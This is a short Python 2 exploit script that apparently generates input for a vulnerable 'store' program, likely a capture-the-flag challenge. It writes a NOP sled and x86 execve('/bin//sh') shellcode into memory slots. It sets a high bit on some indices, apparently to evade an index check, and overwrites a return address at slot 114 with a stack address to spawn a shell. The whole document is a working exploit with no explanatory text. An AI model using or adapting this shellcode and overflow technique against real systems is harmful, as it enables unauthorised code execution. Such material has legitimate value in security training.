shellcode = [
    0x6850c031,
    0x68732f6e,
    0x622f2f68,
    0x99e38969,
    0xe1895352,
    0x80cd0bb0]

def get_i(index):
    return index if index % 3 else index | 0x40000000

for i in range(93):
    print 'store'
    print 0x90909090
    print get_i(i);

for i, v in enumerate(shellcode):
    print 'store'
    print v
    print get_i(i+93)

print 'store'
print 0xffffdc80
print get_i(114)

print 'quit'
